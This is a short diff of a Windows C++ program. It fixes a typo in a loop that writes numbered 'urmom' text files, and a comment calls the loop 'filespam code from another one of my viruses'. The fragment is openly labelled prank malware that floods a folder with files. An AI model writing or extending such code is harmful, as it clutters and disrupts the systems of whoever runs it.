@@ -86,7 +86,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 		
 			// filespam code from another one of my viruses
 			ofstream filespam(path.string() + "\\urmom" + to_string(counter) + ".txt");
-			filespame << "HI";
+			filespam << "HI";
 			counter++;
         }
         break;
@@ -101,5 +101,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     }
 	return 0;
 }
+
 
 
